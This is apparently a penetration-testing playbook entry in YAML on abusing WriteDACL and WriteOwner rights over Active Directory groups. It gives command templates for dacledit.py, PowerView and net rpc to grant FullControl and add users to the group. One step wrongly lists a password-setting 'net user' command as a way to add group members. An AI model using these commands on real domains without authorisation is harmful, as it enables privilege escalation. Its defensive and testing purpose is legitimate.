title: Owns Permissions (WriteDACL + WriteOwner) Exploitation on Groups
category: 
  - AD:
    - ACL:
      - Groups 
tactic: Privilege Escalation
tags: []
description:
  - title: Overview
    content: Owns Permissions (WriteDACL + WriteOwner) allows to add GerericAll permission, 
      then it can be used to add users to the group.
    references:
      - type: link
        value: https://habr.com/ru/companies/solarsecurity/articles/681108/
      - type: link
        value: https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse

steps:
  - description: Modify ACL on the group (add GenericAll permissions)
    options: 
      - tool: dacledit.py
        usage: python3 examples/dacledit.py -action write -rights FullControl -k -principal <username> -target "<groupname>" -dc-ip <dc-ip>  domain.com/username@dc.domain.com -debug
      
  - description: Add a user to the group
    options: 
      - tool: net user
        usage: net user <username> <password> /domain
      
      - tool: powerview 
        usage: Add-DomainGroupMember -Identity "<GroupName>" -Members username -Verbose
      
      - tool: net rpc (linux)
        usage: net rpc group addmem "domain.com\group name" <username> -U 'domain.com\username' -S dc.domain.com
        comments: --use-kerberos=required can be added for kerberos
  
comments:
  